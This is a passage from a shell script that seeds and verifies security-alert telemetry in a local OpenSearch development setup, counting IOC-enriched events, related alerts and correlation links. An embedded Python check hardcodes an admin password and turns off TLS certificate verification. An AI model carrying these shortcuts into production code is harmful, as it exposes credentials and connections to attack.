success "IOC events and related alerts indexed (${IOC_CHUNK_COUNT} chunks)"

# Cleanup temp file
rm -f "$IOC_NDJSON_FILE"

echo ""

# ─── Task 3.10: Verify IOC events and related alerts ────────────────────────

info "Verifying IOC-enriched events..."

# Refresh indices so docs are searchable
${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_refresh" 2>/dev/null > /dev/null
${CURL_OS} -X POST "${OS_URL}/v3-hive-alert-*/_refresh" 2>/dev/null > /dev/null

# Verify IOC events: check file.hash.sha256 fields exist
IOC_HASH_COUNT=$(${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_count" \
  -H "${CONTENT_TYPE}" \
  -d '{"query":{"bool":{"must":[{"exists":{"field":"file.hash.sha256"}},{"exists":{"field":"threat.indicator.type"}}]}}}' 2>/dev/null | \
  python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    print(r.get('count', 0))
except:
    print('0')
" 2>/dev/null)

if [ "$IOC_HASH_COUNT" -gt 0 ] 2>/dev/null; then
  success "IOC hash events verified: ${IOC_HASH_COUNT} events with file.hash.sha256 + threat.indicator"
else
  warn "IOC hash verification: no events found with file.hash.sha256"
fi

# Verify threat.indicator enrichment on domain/IP events
IOC_TI_COUNT=$(${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_count" \
  -H "${CONTENT_TYPE}" \
  -d '{"query":{"bool":{"must":[{"exists":{"field":"threat.indicator.type"}},{"exists":{"field":"threat.indicator.confidence"}}]}}}' 2>/dev/null | \
  python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    print(r.get('count', 0))
except:
    print('0')
" 2>/dev/null)

if [ "$IOC_TI_COUNT" -gt 0 ] 2>/dev/null; then
  success "Threat indicator enrichment verified: ${IOC_TI_COUNT} events with threat.indicator fields"
else
  warn "Threat indicator verification: no enriched events found"
fi

# Verify related alerts exist
REL_ALERT_COUNT=$(${CURL_OS} -X POST "${OS_URL}/v3-hive-alert-*/_count" \
  -H "${CONTENT_TYPE}" \
  -d '{"query":{"wildcard":{"id.keyword":{"value":"REL-*"}}}}' 2>/dev/null | \
  python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    print(r.get('count', 0))
except:
    print('0')
" 2>/dev/null)

if [ "$REL_ALERT_COUNT" -gt 0 ] 2>/dev/null; then
  success "Related alerts verified: ${REL_ALERT_COUNT} REL-* alerts indexed"
else
  warn "Related alerts verification: no REL-* alerts found"
fi

# Verify correlation: for each investigation alert, at least 2 others share
# primaryEntityId or correlationId (Task 3.10)
info "Verifying correlation dimensions..."

CORR_VERIFY_PASS=0
CORR_VERIFY_FAIL=0
SAMPLE_INV_IDS=("INV-CWM-001" "INV-CWM-002" "INV-CWM-003" "INV-CWM-004" "INV-CWM-005")

for SAMPLE_ID in "${SAMPLE_INV_IDS[@]}"; do
  # Get the primaryEntityId and correlationId for this alert
  ALERT_INFO=$(${CURL_OS} -X POST "${OS_URL}/v3-hive-alert-*/_search" \
    -H "${CONTENT_TYPE}" \
    -d "{\"query\":{\"term\":{\"id.keyword\":\"${SAMPLE_ID}\"}},\"size\":1,\"_source\":[\"primaryEntityId\",\"correlationId\"]}" 2>/dev/null)

  RELATED_COUNT=$(echo "$ALERT_INFO" | python3 -c "
import sys, json, urllib.request, ssl, base64

OS_URL = 'https://localhost:9200'
OS_USER = 'admin'
OS_PASS = 'LocalDev@2024!'

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

try:
    r = json.load(sys.stdin)
    hits = r.get('hits', {}).get('hits', [])
    if not hits:
        print('0')
        sys.exit(0)

    doc = hits[0]['_source']
    entity_id = doc.get('primaryEntityId', '')
    corr_id = doc.get('correlationId', '')
    sample_id = '${SAMPLE_ID}'

    # Count alerts sharing primaryEntityId OR correlationId (excluding self)
    query = {
        'query': {
            'bool': {
                'must_not': [{'term': {'id.keyword': sample_id}}],
                'should': [
                    {'term': {'primaryEntityId.keyword': entity_id}},
                    {'term': {'correlationId.keyword': corr_id}}
                ],
                'minimum_should_match': 1
            }
        },
        'size': 0
    }
    data = json.dumps(query).encode()
    creds = base64.b64encode(f'{OS_USER}:{OS_PASS}'.encode()).decode()
    req = urllib.request.Request(f'{OS_URL}/v3-hive-alert-*/_search',
                                data=data, method='POST')
    req.add_header('Content-Type', 'application/json')
    req.add_header('Authorization', f'Basic {creds}')
    with urllib.request.urlopen(req, context=ctx) as resp:
        result = json.loads(resp.read())
        total = result.get('hits', {}).get('total', {}).get('value', 0)
        print(total)
except Exception as e:
    print('0')
" 2>/dev/null)

  if [ "$RELATED_COUNT" -ge 2 ] 2>/dev/null; then
    CORR_VERIFY_PASS=$((CORR_VERIFY_PASS + 1))
  else
    CORR_VERIFY_FAIL=$((CORR_VERIFY_FAIL + 1))
  fi
done

if [ $CORR_VERIFY_FAIL -eq 0 ] && [ $CORR_VERIFY_PASS -gt 0 ]; then
  success "Correlation verification passed: all ${CORR_VERIFY_PASS} sampled alerts have >= 2 correlated alerts"
elif [ $CORR_VERIFY_PASS -gt 0 ]; then
  warn "Correlation verification: ${CORR_VERIFY_PASS} passed, ${CORR_VERIFY_FAIL} failed"
else
  warn "Correlation verification: could not verify (OpenSearch may not be running or INV-* alerts not seeded)"
fi

# Verify IOC diversity: check a sample alert has 3+ IOC types
info "Verifying IOC diversity per alert..."

${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_search" \
  -H "${CONTENT_TYPE}" \
  -d '{"query":{"bool":{"must":[{"term":{"alert.id.keyword":"INV-CWM-001"}},{"exists":{"field":"threat.indicator.type"}}]}},"size":20,"_source":["threat.indicator.type","file.hash.sha256","dns.question.name","destination.ip"]}' 2>/dev/null | \
  python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    hits = r.get('hits', {}).get('hits', [])
    if not hits:
        print('  No IOC events found for INV-CWM-001')
        sys.exit(0)

    ioc_types = set()
    ioc_values = set()
    for hit in hits:
        doc = hit['_source']
        ti_type = doc.get('threat', {}).get('indicator', {}).get('type', '')
        if ti_type:
            ioc_types.add(ti_type)
        sha = doc.get('file', {}).get('hash', {}).get('sha256', '')
        if sha:
            ioc_values.add(f'sha256:{sha[:16]}...')
        domain = doc.get('dns', {}).get('question', {}).get('name', '')
        if domain:
            ioc_values.add(f'domain:{domain}')
        dst_ip = doc.get('destination', {}).get('ip', '')
        if dst_ip and not dst_ip.startswith('10.'):
            ioc_values.add(f'ip:{dst_ip}')

    print(f'  IOC types found: {sorted(ioc_types)}')
    print(f'  Unique IOC values: {len(ioc_values)} (need 3-10)')
    if len(ioc_types) >= 2 and len(ioc_values) >= 3:
        print('  IOC diversity: PASS')
    else:
        print('  IOC diversity: NEEDS MORE TYPES')
except Exception as e:
    print(f'  IOC diversity check error: {e}')
" 2>/dev/null

echo ""

# ─── Final Summary ───────────────────────────────────────────────────────────

echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}  Telemetry Seed Complete${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  ✓ Process tree events (4-12 per alert)"
echo -e "  ✓ Network activity events (10-30 per alert)"
echo -e "  ✓ IOC-enriched events (3-10 unique IOCs per alert)"
echo -e "  ✓ Related alert chains (2-5 per scenario)"
echo ""
